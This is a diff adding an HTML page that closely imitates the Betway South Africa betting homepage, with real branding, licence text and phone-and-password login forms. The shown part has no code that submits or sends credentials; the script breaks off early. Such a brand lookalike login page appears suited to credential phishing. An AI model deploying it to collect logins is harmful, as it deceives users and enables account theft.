@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Betway - Sports Betting & Live Games</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        betwayGreen: '#00a826',
+                        betwayGreenDark: '#00851e',
+                        betwayYellow: '#f5a623',
+                        betwayDark: '#121212',
+                        betwayBar: '#1e1e1e',
+                        betwayInput: '#2a2a2a',
+                        betwayFooterBg: '#1f1f1f'
+                    },
+                    fontFamily: {
+                        sans: ['Roboto', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            font-family: 'Roboto', sans-serif;
+            user-select: none;
+        }
+
+        .hero-bg {
+            background: linear-gradient(180deg, rgba(0,0,0,0.5) 0%, rgba(18,18,18,0.85) 85%, rgba(18,18,18,1) 100%),
+                        url('https://cdn.betwaygroup.com/medusa-production-cache/c/1/c171858296547870cdc950a2d77703ffc501d388.jpg') center/cover no-repeat;
+            min-height: calc(100vh - 105px);
+        }
+        .no-scrollbar::-webkit-scrollbar {
+            display: none;
+        }
+        .no-scrollbar {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #121212;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 3px;
+        }
+
+        .btn-hover {
+            transition: all 0.2s ease-in-out;
+        }
+        .btn-hover:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.1);
+        }
+
+        .line-clamp-3-custom {
+            display: -webkit-box;
+            -webkit-line-clamp: 3;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        .line-clamp-none {
+            -webkit-line-clamp: unset !important;
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen overflow-x-hidden">
+    <header class="bg-black text-white border-b border-gray-800 sticky top-0 z-50">
+        <div class="max-w-[1400px] mx-auto px-4 h-16 flex items-center justify-between">
+            
+            <div class="flex items-center space-x-4">
+                <button id="menuBtn" class="text-gray-300 hover:text-white p-2 text-xl focus:outline-none" aria-label="Toggle Navigation">
+                    <i class="fa-solid fa-bars"></i>
+                </button>
+                
+                <a href="#" class="flex items-center">
+                    <span class="text-3xl font-black tracking-tighter text-white">betway</span>
+                </a>
+            </div>
+            <form id="loginForm" class="hidden lg:flex items-center space-x-2 text-xs">
+                <div class="flex flex-col">
+                    <div class="flex items-center">
+                        <span class="bg-[#2a2a2a] text-gray-300 px-2.5 py-1.5 rounded-l border border-r-0 border-gray-700 font-medium">+27</span>
+                        <input type="text" id="phoneInput" name="username" placeholder="Mobile Number" class="bg-[#2a2a2a] text-white px-3 py-1.5 rounded-r border border-gray-700 focus:outline-none focus:border-betwayGreen w-32 placeholder-gray-500" required>
+                    </div>
+                    <a href="#" class="text-[10px] text-gray-400 hover:underline mt-0.5 text-right">Forgot Username?</a>
+                </div>
+
+                <div class="flex flex-col">
+                    <div class="relative flex items-center">
+                        <input type="password" id="passwordInput" name="password" placeholder="Enter Password" class="bg-[#2a2a2a] text-white pl-3 pr-8 py-1.5 rounded border border-gray-700 focus:outline-none focus:border-betwayGreen w-36 placeholder-gray-500" required>
+                        <button type="button" id="togglePasswordBtn" class="absolute right-2 text-gray-400 hover:text-white">
+                            <i class="fa-regular fa-eye text-xs"></i>
+                        </button>
+                    </div>
+                    <a href="#" class="text-[10px] text-gray-400 hover:underline mt-0.5 text-right">Forgot Password?</a>
+                </div>
+
+                <div class="flex flex-col justify-start">
+                    <button type="submit" id="loginBtn" class="bg-white text-black font-bold px-4 py-1.5 rounded hover:bg-gray-200 transition text-xs btn-hover">
+                        Login
+                    </button>
+                    <span id="message" class="h-4 text-[10px] text-betwayYellow font-medium truncate max-w-[100px]"></span>
+                </div>
+
+                <div class="flex flex-col justify-start">
+                    <button type="button" id="signupBtn" class="bg-betwayGreen text-white font-bold px-4 py-1.5 rounded hover:bg-betwayGreenDark transition text-xs btn-hover">
+                        Sign Up
+                    </button>
+                    <span class="h-4"></span>
+                </div>
+
+                <div class="flex flex-col justify-start">
+                    <button type="button" class="text-gray-300 hover:text-white p-1.5 text-base ml-1">
+                        <i class="fa-solid fa-magnifying-glass"></i>
+                    </button>
+                    <span class="h-4"></span>
+                </div>
+            </form>
+
+            <div class="flex lg:hidden items-center space-x-2">
+                <button id="mobileLoginTrigger" class="bg-white text-black text-xs font-bold px-3 py-1.5 rounded">
+                    Login
+                </button>
+                <button id="mobileSignupTrigger" class="bg-betwayGreen text-white text-xs font-bold px-3 py-1.5 rounded">
+                    Sign Up
+                </button>
+            </div>
+        </div>
+        <div id="mobileLoginModal" class="fixed inset-0 bg-black/70 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+            <div class="bg-[#181818] w-full max-w-sm rounded-xl border border-gray-800 shadow-2xl overflow-hidden">
+                <div class="flex items-center justify-between px-5 py-4 border-b border-gray-800 bg-[#222]">
+                    <h3 class="font-bold text-white text-base">Login</h3>
+                    <button id="closeMobileLoginBtn" class="text-gray-400 hover:text-white text-lg focus:outline-none">
+                        <i class="fa-solid fa-xmark"></i>
+                    </button>
+                </div>
+                <form id="mobileLoginForm" class="p-5 space-y-4">
+                    <div class="flex items-center bg-[#2a2a2a] rounded border border-gray-700 focus-within:border-betwayGreen">
+                        <span class="text-gray-300 px-3 py-2.5 font-medium border-r border-gray-700 text-sm">+27</span>
+                        <input type="text" name="username" placeholder="Mobile Number" class="bg-transparent text-white px-3 py-2.5 w-full focus:outline-none text-sm placeholder-gray-500" required>
+                    </div>
+                    <div class="relative flex items-center bg-[#2a2a2a] rounded border border-gray-700 focus-within:border-betwayGreen">
+                        <input type="password" id="mobilePasswordInput" name="password" placeholder="Enter Password" class="bg-transparent text-white px-3 py-2.5 pr-10 w-full focus:outline-none text-sm placeholder-gray-500" required>
+                        <button type="button" id="toggleMobilePasswordBtn" class="absolute right-3 text-gray-400 hover:text-white">
+                            <i class="fa-regular fa-eye text-sm"></i>
+                        </button>
+                    </div>
+                    <div class="flex justify-between text-xs text-gray-400 pt-1">
+                        <a href="bet" class="hover:underline">Forgot Username?</a>
+                        <a href="#" class="hover:underline">Forgot Password?</a>
+                    </div>
+                    <div class="bg-[#222] -mx-5 -mb-5 p-5 mt-4 border-t border-gray-800 space-y-3">
+                        <div class="flex items-center justify-between bg-[#2a2a2a] px-4 py-3 rounded border border-gray-700">
+                            <span class="text-xs text-gray-300">Don't have an account yet?</span>
+                            <a href="#" class="text-xs font-bold text-betwayGreen hover:underline flex items-center space-x-1">
+                                <span>Sign Up</span>
+                                <i class="fa-solid fa-chevron-right text-[10px]"></i>
+                            </a>
+                        </div>
+                        <button type="submit" class="w-full bg-betwayGreen hover:bg-betwayGreenDark text-white font-bold py-3 rounded-lg transition text-sm">
+                            Login
+                        </button>
+                        <span id="mobileMessage" class="block text-center text-xs text-betwayYellow font-medium h-4"></span>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </header>
+    <nav class="bg-[#1e1e1e] border-b border-gray-800 text-xs font-semibold relative">
+        <div class="max-w-[1400px] mx-auto px-2 flex items-center justify-between h-12">
+            <div id="subnavContainer" class="flex items-center h-full space-x-1 overflow-x-auto no-scrollbar scroll-smooth flex-grow pr-2">
+                
+                <a href="#" class="nav-tab active flex flex-col sm:flex-row items-center justify-center sm:space-x-1.5 bg-betwayGreen text-white px-3.5 h-full transition-colors whitespace-nowrap flex-shrink-0">
+                    <i class="fa-solid fa-house text-sm"></i>
+                    <span class="text-[11px] sm:text-xs capitalize">home</span>
+                </a>
+
+                <a href="https://www.betway.co.za/sport/soccer" class="nav-tab flex flex-col sm:flex-row items-center justify-center sm:space-x-1.5 text-gray-300 hover:text-white hover:bg-[#2a2a2a] px-3 h-full transition-colors whitespace-nowrap flex-shrink-0">
+                    <i class="fa-regular fa-futbol text-sm"></i>
+                    <span class="text-[11px] sm:text-xs capitalize">sport</span>
+                </a>
+
+                <a href="https://www.betway.co.za/live" class="nav-tab flex flex-col sm:flex-row items-center justify-center sm:space-x-1.5 text-gray-300 hover:text-white hover:bg-[#2a2a2a] px-3 h-full transition-colors whitespace-nowrap flex-shrink-0">
+                    <i class="fa-solid fa-tower-broadcast text-sm"></i>
+                    <span class="text-[11px] sm:text-xs capitalize">live</span>
+                </a>
+
+                <a href="https://www.betway.co.za/lobby/casino-games/game/aviator" class="nav-tab flex flex-col sm:flex-row items-center justify-center sm:space-x-1.5 text-gray-300 hover:text-white hover:bg-[#2a2a2a] px-3 h-full transition-colors whitespace-nowrap flex-shrink-0">
+                    <i class="fa-solid fa-plane-up text-sm"></i>
+                    <span class="text-[11px] sm:text-xs capitalize">aviator</span>
+                </a>
+
+                <a href="https://www.betway.co.za/lobby/casino-games" class="nav-tab flex flex-col sm:flex-row items-center justify-center sm:space-x-1.5 text-gray-300 hover:text-white hover:bg-[#2a2a2a] px-3 h-full transition-colors whitespace-nowrap flex-shrink-0">
+                    <i class="fa-solid fa-dice text-sm"></i>
+                    <span class="text-[11px] sm:text-xs capitalize">casino</span>
+                </a>
+
+                <a href="https://www.betway.co.za/lobby/slots" class="nav-tab flex flex-col sm:flex-row items-center justify-center sm:space-x-1.5 text-gray-300 hover:text-white hover:bg-[#2a2a2a] px-3 h-full transition-colors whitespace-nowrap flex-shrink-0">
+                    <i class="fa-solid fa-gamepad text-sm"></i>
+                    <span class="text-[11px] sm:text-xs capitalize">slots</span>
+                </a>
+
+                <a href="https://www.betway.co.za/lobby/crash" class="nav-tab flex flex-col sm:flex-row items-center justify-center sm:space-x-1.5 text-gray-300 hover:text-white hover:bg-[#2a2a2a] px-3 h-full transition-colors whitespace-nowrap flex-shrink-0">
+                    <i class="fa-solid fa-chart-line text-sm"></i>
+                    <span class="text-[11px] sm:text-xs capitalize">crash</span>
+                </a>
+
+                <a href="https://www.betway.co.za/lobby/livecasino" class="nav-tab flex flex-col sm:flex-row items-center justify-center sm:space-x-1.5 text-gray-300 hover:text-white hover:bg-[#2a2a2a] px-3 h-full transition-colors whitespace-nowrap flex-shrink-0">
+                    <i class="fa-solid fa-video text-sm"></i>
+                    <span class="text-[11px] sm:text-xs capitalize">live casino</span>
+                </a>
+
+                <a href="https://www.betway.co.za/lobby/quick-games" class="nav-tab flex flex-col sm:flex-row items-center justify-center sm:space-x-1.5 text-gray-300 hover:text-white hover:bg-[#2a2a2a] px-3 h-full transition-colors whitespace-nowrap flex-shrink-0">
+                    <i class="fa-solid fa-bolt text-sm"></i>
+                    <span class="text-[11px] sm:text-xs capitalize">quick games</span>
+                </a>
+
+                <a href="https://www.betway.co.za/sport/horse-racing" class="nav-tab flex flex-col sm:flex-row items-center justify-center sm:space-x-1.5 text-gray-300 hover:text-white hover:bg-[#2a2a2a] px-3 h-full transition-colors whitespace-nowrap flex-shrink-0">
+                    <i class="fa-solid fa-horse-head text-sm"></i>
+                    <span class="text-[11px] sm:text-xs capitalize">horse racing</span>
+                </a>
+
+                <a href="https://www.betway.co.za/luckynumbers" class="nav-tab flex flex-col sm:flex-row items-center justify-center sm:space-x-1.5 text-gray-300 hover:text-white hover:bg-[#2a2a2a] px-3 h-full transition-colors whitespace-nowrap flex-shrink-0">
+                    <i class="fa-solid fa-clover text-sm"></i>
+                    <span class="text-[11px] sm:text-xs capitalize">lucky numbers</span>
+                </a>
+
+                <a href="https://www.betway.co.za/tote/soccer" class="nav-tab flex flex-col sm:flex-row items-center justify-center sm:space-x-1.5 text-gray-300 hover:text-white hover:bg-[#2a2a2a] px-3 h-full transition-colors whitespace-nowrap flex-shrink-0">
+                    <i class="fa-solid fa-trophy text-sm"></i>
+                    <span class="text-[11px] sm:text-xs capitalize">soccer tote</span>
+                </a>
+
+                <a href="https://www.betway.co.za/lobby/virtuals" class="nav-tab flex flex-col sm:flex-row items-center justify-center sm:space-x-1.5 text-gray-300 hover:text-white hover:bg-[#2a2a2a] px-3 h-full transition-colors whitespace-nowrap flex-shrink-0">
+                    <i class="fa-solid fa-vr-cardboard text-sm"></i>
+                    <span class="text-[11px] sm:text-xs capitalize">virtuals</span>
+                </a>
+
+                <a href="https://www.betway.co.za/esports" class="nav-tab flex flex-col sm:flex-row items-center justify-center sm:space-x-1.5 text-gray-300 hover:text-white hover:bg-[#2a2a2a] px-3 h-full transition-colors whitespace-nowrap flex-shrink-0">
+                    <i class="fa-solid fa-headset text-sm"></i>
+                    <span class="text-[11px] sm:text-xs capitalize">esports</span>
+                </a>
+
+                <a href="https://www.betway.co.za/promotions" class="nav-tab flex flex-col sm:flex-row items-center justify-center sm:space-x-1.5 text-gray-300 hover:text-white hover:bg-[#2a2a2a] px-3 h-full transition-colors whitespace-nowrap flex-shrink-0">
+                    <i class="fa-solid fa-gift text-sm"></i>
+                    <span class="text-[11px] sm:text-xs capitalize">promotions</span>
+                </a>
+            </div>
+            <div class="flex items-center pl-3 bg-[#1e1e1e] flex-shrink-0">
+                <button id="betslipBtn" class="flex items-center space-x-2 text-white bg-[#2a2a2a] hover:bg-[#333] px-3.5 py-1.5 rounded-full transition shadow-md">
+                    <span class="font-bold text-xs">Betslip</span>
+                    <span id="betslipCount" class="bg-betwayGreen text-white text-[10px] font-bold px-1.5 py-0.5 rounded-full min-w-[18px] text-center">0</span>
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <main class="flex-grow hero-bg relative flex flex-col justify-between items-center py-12 sm:py-20 px-4">
+        <div class="flex flex-row items-center justify-center gap-3 sm:gap-6 my-auto w-full max-w-sm sm:max-w-md px-2">
+            <a href="https://www.betway.co.za/sport/soccer" class="w-1/2 bg-[#00a826] hover:bg-[#008f20] active:scale-95 text-white font-extrabold text-lg sm:text-2xl py-3.5 sm:py-4 rounded-xl sm:rounded-2xl flex items-center justify-center shadow-xl border border-emerald-400/30 btn-hover transition-all duration-200">
+                Sport
+            </a>
+            <a href="https://www.betway.co.za/lobby/casino-games" class="w-1/2 bg-[#0066eb] hover:bg-[#0052c2] active:scale-95 text-white font-extrabold text-lg sm:text-2xl py-3.5 sm:py-4 rounded-xl sm:rounded-2xl flex items-center justify-center shadow-xl border border-blue-400/30 btn-hover transition-all duration-200">
+                Casino
+            </a>
+        </div>
+        <div class="w-full max-w-4xl flex flex-col items-center justify-center mt-auto pt-6">
+
+            <div class="text-center mb-4">
+                <a href="https://betway.com" target="_blank" rel="noopener noreferrer" class="inline-block hover:opacity-80 transition-opacity">
+                    <span class="text-2xl sm:text-3xl font-black tracking-tighter text-white drop-shadow-md">betway</span>
+                </a>
+            </div>
+            <div class="flex items-center justify-center flex-wrap gap-5 sm:gap-8 px-4 py-2">
+                <a href="https://www.springboks.rugby" target="_blank" rel="noopener noreferrer" class="hover:scale-110 transition-transform duration-200" title="Springboks Rugby">
+                    <img src="https://media.betwayafrica.com/medialibraries/content.gmgamingsystems.com/Synapse/v2/South_Africa_national_rugby_union_team-svg.png" alt="Springboks Rugby" class="h-6 sm:h-8 w-auto object-contain">
+                </a>
+                <a href="https://www.arsenal.com" target="_blank" rel="noopener noreferrer" class="hover:scale-110 transition-transform duration-200" title="Arsenal FC">
+                    <img src="https://media.betwayafrica.com/medialibraries/content.gmgamingsystems.com/Synapse/sponsorships/Arsenal_FC.png" alt="Arsenal FC" class="h-7 sm:h-9 w-auto object-contain">
+                </a>
+                <a href="https://www.mancity.com" target="_blank" rel="noopener noreferrer" class="hover:scale-110 transition-transform duration-200" title="Manchester City">
+                    <img src="https://media.betwayafrica.com/medialibraries/content.gmgamingsystems.com/Synapse/sponsorships/ManCity_Logo.png" alt="Manchester City" class="h-7 sm:h-9 w-auto object-contain">
+                </a>
+                <a href="https://www.manutd.com/en" target="_blank" rel="noopener noreferrer" class="hover:scale-110 transition-transform duration-200" title="Arsenal FC">
+                    <img src="https://media.betwayafrica.com/medialibraries/content.gmgamingsystems.com/Synapse/sponsorships/man-united-logo.png" alt="Arsenal FC" class="h-7 sm:h-9 w-auto object-contain">
+                </a>
+                <a href="https://www.formula1.com/" target="_blank" rel="noopener noreferrer" class="hover:scale-110 transition-transform duration-200" title="Formula 1">
+                    <img src="https://media.betwayafrica.com/medialibraries/content.gmgamingsystems.com/Synapse/sponsorships/F1-1.png" alt="Formula 1" class="h-7 sm:h-9 w-auto object-contain">
+                </a>
+
+            </div>
+        </div>
+    </main>
+    <footer class="bg-[#1f1f1f] text-gray-300 text-xs border-t border-gray-800">
+        <div class="max-w-[1400px] mx-auto px-4 sm:px-6 pt-8 pb-6">
+            <div class="mb-8 border-b border-gray-800 pb-6 relative">
+                <h2 class="text-sm sm:text-base font-bold text-white mb-2">Welcome to Sports Betting with Betway South Africa</h2>
+                <div id="footerTextContent" class="text-gray-400 leading-relaxed text-[11px] sm:text-xs line-clamp-3-custom transition-all duration-300">
+                    <p class="mb-2">
+                        <strong class="text-white">Betway</strong> offers the very best in online sports betting. There is nothing that quite matches the excitement of watching your favorite teams go head-to-head with their biggest rivals in the most popular global sport of them all, football. The only thing that could make this experience any better would be by raising the stakes and backing your teams with a bet aimed at upping the intensity. <a href="#" class="text-betwayGreen hover:underline">Place a bet and start backing your team!</a>
+                    </p>
+                    <p>
+                        From football to tennis, rugby to cricket, there is nothing that can match the intensity and excitement that comes from rooting for your favorite team or player as they take on their biggest rivals in a battle to determine bragging rights for weeks to come. The Betway platform allows you to easily place bets online with competitive odds, flexible markets, and live in-play action directly from your mobile device or computer.
+                    </p>
+                </div>
+
+                <div class="flex justify-center mt-3">
+                    <button id="toggleShowMoreBtn" class="bg-[#2a2a2a] hover:bg-[#333] text-gray-200 px-4 py-1.5 rounded-full text-xs font-semibold flex items-center space-x-1 border border-gray-700 transition">
+                        <span id="showMoreLabel">Show More</span>
+                        <i id="showMoreIcon" class="fa-solid fa-chevron-down text-[10px]"></i>
+                    </button>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-y-4 gap-x-8 text-[12px] font-semibold mb-8">
+                <div class="space-y-2.5">
+                    <a href="https://www.betway.co.za/how-to-bet" class="block hover:text-white transition">How To Bet</a>
+                    <a href="https://www.betway.co.za/betway-app" class="block hover:text-white transition">Betway App</a>
+                    <a href="https://www.betway.co.za/contact-us" class="block hover:text-white transition">Contact Us</a>
+                    <a href="https://www.betway.co.za/responsible-gaming" class="block hover:text-white transition">Responsible Gaming</a>
+                </div>
+
+                <div class="space-y-2.5">
+                    <a href="https://www.betway.co.za/frequently-asked-questions" class="block hover:text-white transition">Frequently asked questions</a>
+                    <a href="https://www.betway.co.za/affiliate-program" class="block hover:text-white transition">Affiliate Program</a>
+                    <a href="https://www.betway.co.za/paia-manual" class="block hover:text-white transition">PAIA Manual</a>
+                </div>
+
+                <div class="space-y-2.5">
+                    <a href="https://www.betway.co.za/terms-and-conditions" class="block hover:text-white transition">Terms & Conditions</a>
+                    <a href="https://www.betway.co.za/privacy-policy" class="block hover:text-white transition">Privacy Policy</a>
+                    <a href="https://www.betway.co.za/play-aviator" class="block hover:text-white transition">Play Aviator</a>
+                </div>
+
+                <div class="space-y-2.5">
+                    <a href="https://www.betway.co.za/betting-rules-and-tips" class="block hover:text-white transition">Betting Rules</a>
+                    <a href="https://www.betway.co.za/sponsorship" class="block hover:text-white transition">Sponsorship</a>
+                    <a href="https://www.betway.co.za/sitemap" class="block hover:text-white transition">Sitemap</a>
+                </div>
+            </div>
+
+            <div class="space-y-3 text-[11px] text-gray-400 border-t border-gray-800 pt-6">
+                <p>
+                    Eastern Dawn Sports (Pty) Ltd (2021/915692/07) is licensed and regulated by the Mpumalanga Economic Regulator. <span class="text-betwayGreen font-medium">Bookmaker License No. 9-2-1-09658</span>.
+                </p>
+                <p>
+                    Raging River Trading (Pty) Ltd (2011/134505/07), licensed and regulated by the Western Cape Gambling and Racing Board. Bookmaker License No. 10181496-012, first issued on 1 December 2016. Both entities are licensed to promote Betway South Africa by the respective provincial licensing authorities.
+                </p>
+                <p>
+                    No persons under the age of 18 years are permitted to bet. Winners know when to stop. 
+                    <span class="text-betwayGreen">National Responsible Gambling Programme: 0800 006 008</span> or 
+                    <span class="text-betwayGreen">WHATSAPP 'HELP' to 076 675 0710</span> (South Africa Responsible Gambling Foundation). Warning: Gambling involves risk, bet responsibly. Gambling on this website, you run the risk that you may lose. All games are fixed-odds betting events.
+                </p>
+                <p class="text-betwayGreen font-bold tracking-wider text-[10px] uppercase pt-1">
+                    MPUMALANGA ECONOMIC REGULATOR
+                </p>
+            </div>
+            <div class="flex flex-col sm:flex-row justify-between items-center text-[11px] text-gray-500 pt-6 border-t border-gray-800/60 mt-6 gap-2">
+                <div>
+                    Version: 15.0.0 | Current time: <span id="footerClock">17:57:25</span>
+                </div>
+                <div>
+                    &copy; 2026 Betway
+                </div>
+            </div>
+        </div>
+
+        <div class="bg-black py-6 border-t border-gray-800">
+            <div class="max-w-[1400px] mx-auto px-4 sm:px-6 flex flex-col md:flex-row items-center justify-between gap-6">
+                
+                <div class="flex items-center space-x-4">
+                    <div class="bg-white p-1.5 rounded-lg flex-shrink-0">
+                        <svg class="w-16 h-16" viewBox="0 0 100 100" fill="black" xmlns="http://www.w3.org/2000/svg">
+                            <rect width="100" height="100" fill="white"/>
+                            <rect x="10" y="10" width="30" height="30" fill="black"/>
+                            <rect x="15" y="15" width="20" height="20" fill="white"/>
+                            <rect x="20" y="20" width="10" height="10" fill="black"/>
+                            <rect x="60" y="10" width="30" height="30" fill="black"/>
+                            <rect x="65" y="15" width="20" height="20" fill="white"/>
+                            <rect x="70" y="20" width="10" height="10" fill="black"/>
+                            <rect x="10" y="60" width="30" height="30" fill="black"/>
+                            <rect x="15" y="65" width="20" height="20" fill="white"/>
+                            <rect x="20" y="70" width="10" height="10" fill="black"/>
+                            <rect x="50" y="10" width="5" height="10" fill="black"/>
+                            <rect x="45" y="25" width="10" height="15" fill="black"/>
+                            <rect x="60" y="50" width="15" height="10" fill="black"/>
+                            <rect x="80" y="45" width="10" height="20" fill="black"/>
+                            <rect x="50" y="65" width="20" height="10" fill="black"/>
+                            <rect x="75" y="75" width="15" height="15" fill="black"/>
+                            <rect x="45" y="80" width="10" height="10" fill="black"/>
+                        </svg>
+                    </div>
+                    <div class="space-y-1.5">
+                        <p class="font-bold text-white text-xs sm:text-sm">Download the Betway app</p>
+                        <p class="text-[11px] text-gray-400">Scan the QR code to initiate the app download</p>
+                        <p class="text-[11px] text-gray-400">Click the respective icon to download</p>
+                        <div class="flex items-center space-x-3 pt-1">
+                            <a href="#" class="bg-[#1f1f1f] hover:bg-[#2a2a2a] p-1.5 rounded-md border border-gray-700 transition" title="iOS App Store">
+                                <svg class="w-4 h-4 fill-current text-white" viewBox="0 0 170 170">
+                                    <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.33.13-9.13-1.9-14.4-6.08-3.81-3.04-7.84-7.89-12.09-14.56-6.8-10.66-12.18-22.38-16.13-35.15-3.95-12.78-5.93-24.87-5.93-36.28 0-15.09 3.8-27.42 11.4-37 7.6-9.58 17.02-14.43 28.25-14.55 4.67 0 9.87 1.2 15.6 3.6 5.73 2.4 9.84 3.65 12.33 3.75 2.18 0 6.39-1.28 12.63-3.85 6.24-2.57 11.58-3.72 16.03-3.45 12.53.98 22.42 5.56 29.68 13.73-11.33 6.84-16.82 16.48-16.47 28.92.35 9.81 4.24 18.02 11.67 24.63 7.43 6.61 16.14 10.4 26.13 11.37-2.62 7.73-6.11 15.38-10.47 22.95zM119.22 31.84c0-7.3 2.66-14.28 7.98-20.94 5.32-6.66 12.1-10.65 20.34-11.97.22 1.3.33 2.4.33 3.3 0 7.3-2.73 14.33-8.19 21.09-5.46 6.76-12.31 10.74-20.55 11.95-.22-.98-.33-2.12-.33-3.43z"/>
+                                </svg>
+                            </a>
+                            <a href="#" class="bg-[#1f1f1f] hover:bg-[#2a2a2a] p-1.5 rounded-md border border-gray-700 transition" title="Google Play Store">
+                                <svg class="w-4 h-4 fill-current text-white" viewBox="0 0 512 512">
+                                    <path d="M325.3 234.3L104.6 13l280.8 161.2-60.1 60.1zM47 0C34 6.8 25.3 19.2 25.3 35.3v441.3c0 16.1 8.7 28.5 21.7 35.3l256.6-256L47 0zm425.2 225.6l-58.9-34.1-65.7 64.5 65.7 64.5 60.1-34.1c18-14.3 18-46.5-1.2-60.8zM104.6 499l220.7-221.3 60.1 60.1L104.6 499z"/>
+                                </svg>
+                            </a>
+                            <a href="#" class="bg-[#1f1f1f] hover:bg-[#2a2a2a] p-1.5 rounded-md border border-gray-700 transition" title="Huawei AppGallery">
+                                <svg class="w-4 h-4 fill-current text-red-500" viewBox="0 0 100 100">
+                                    <rect x="10" y="10" width="80" height="80" rx="15" fill="#c00"/>
+                                    <path d="M30 40 Q50 20 70 40 Q50 60 30 40 Z" fill="white"/>
+                                </svg>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                <div class="flex items-center space-x-3 text-gray-400">
+                    <a href="#" class="w-8 h-8 rounded-full bg-[#1f1f1f] border border-gray-800 flex items-center justify-center hover:text-white hover:border-gray-600 transition" title="Telegram">
+                        <i class="fa-brands fa-telegram"></i>
+                    </a>
+                    <a href="#" class="w-8 h-8 rounded-full bg-[#1f1f1f] border border-gray-800 flex items-center justify-center hover:text-white hover:border-gray-600 transition" title="Facebook">
+                        <i class="fa-brands fa-facebook-f"></i>
+                    </a>
+                    <a href="#" class="w-8 h-8 rounded-full bg-[#1f1f1f] border border-gray-800 flex items-center justify-center hover:text-white hover:border-gray-600 transition" title="Instagram">
+                        <i class="fa-brands fa-instagram"></i>
+                    </a>
+                    <a href="#" class="w-8 h-8 rounded-full bg-[#1f1f1f] border border-gray-800 flex items-center justify-center hover:text-white hover:border-gray-600 transition" title="X / Twitter">
+                        <i class="fa-brands fa-x-twitter"></i>
+                    </a>
+                </div>
+
+            </div>
+        </div>
+    </footer>
+
+    <div id="mobileMenuOverlay" class="fixed inset-0 bg-black/70 backdrop-blur-sm z-50 hidden transition-opacity">
+        <div class="w-72 bg-[#181818] h-full shadow-2xl flex flex-col justify-between p-5 border-r border-gray-800">
+            <div>
+                <div class="flex items-center justify-between border-b border-gray-800 pb-4 mb-4">
+                    <span class="text-2xl font-black text-white">betway</span>
+                    <button id="closeMenuBtn" class="text-gray-400 hover:text-white text-xl">
+                        <i class="fa-solid fa-xmark"></i>
+                    </button>
+                </div>
+
+                <div class="space-y-3 font-medium text-sm">
+                    <a href="#" class="flex items-center space-x-3 text-white bg-betwayGreen px-3 py-2.5 rounded-lg">
+                        <i class="fa-solid fa-house"></i>
+                        <span>Home</span>
+                    </a>
+                    <a href="#" class="flex items-center space-x-3 text-gray-300 hover:text-white hover:bg-[#252525] px-3 py-2.5 rounded-lg">
+                        <i class="fa-regular fa-futbol"></i>
+                        <span>Sports Betting</span>
+                    </a>
+                    <a href="#" class="flex items-center space-x-3 text-gray-300 hover:text-white hover:bg-[#252525] px-3 py-2.5 rounded-lg">
+                        <i class="fa-solid fa-tower-broadcast"></i>
+                        <span>Live Games</span>
+                    </a>
+                    <a href="#" class="flex items-center space-x-3 text-gray-300 hover:text-white hover:bg-[#252525] px-3 py-2.5 rounded-lg">
+                        <i class="fa-solid fa-gift"></i>
+                        <span>Promotions</span>
+                    </a>
+                    <a href="#" class="flex items-center space-x-3 text-gray-300 hover:text-white hover:bg-[#252525] px-3 py-2.5 rounded-lg">
+                        <i class="fa-solid fa-headset"></i>
+                        <span>Help & Support</span>
+                    </a>
+                </div>
+            </div>
+
+            <div class="border-t border-gray-800 pt-4 text-xs text-gray-500 text-center">
+                &copy; Betway Official 2026. All rights reserved.
+            </div>
+        </div>
+    </div>
+
+    <div id="betslipDrawer" class="fixed bottom-0 right-0 lg:right-6 w-full lg:w-96 bg-[#1a1a1a] border border-gray-800 rounded-t-xl shadow-2xl z-50 transform translate-y-full transition-transform duration-300">
+        <div class="p-4 border-b border-gray-800 flex items-center justify-between bg-[#222] rounded-t-xl">
+            <div class="flex items-center space-x-2">
+                <i class="fa-solid fa-ticket text-betwayGreen"></i>
+                <h3 class="font-bold text-sm text-white">Your Betslip</h3>
+            </div>
+            <button id="closeBetslipBtn" class="text-gray-400 hover:text-white">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+        </div>
+        <div class="p-6 text-center text-gray-400 text-sm">
+            <i class="fa-solid fa-receipt text-3xl mb-2 text-gray-600 block"></i>
+            Your betslip is currently empty.
+            <p class="text-xs text-gray-500 mt-1">Select odds from matches to build your multi-bet.</p>
+        </div>
+    </div>
+
+    <script>
+        const mobileLoginTrigger = document.getElementById('mobileLoginTrigger');
+        const mobileLoginModal = document.getElementById('mobileLoginModal');
+        const closeMobileLoginBtn = document.getElementById('closeMobileLoginBtn');
+
+        if (mobileLoginTrigger && mobileLoginModal && closeMobileLoginBtn) {
+            mobileLoginTrigger.addEventListener('click', () => {
+                mobileLoginModal.classList.remove('hidden');
+            });
+
+            closeMobileLoginBtn.addEventListener('click', () => {
+                mobileLoginModal.classList.add('hidden');
+            });
+
+            mobileLoginModal.addEventListener('click', (e) => {
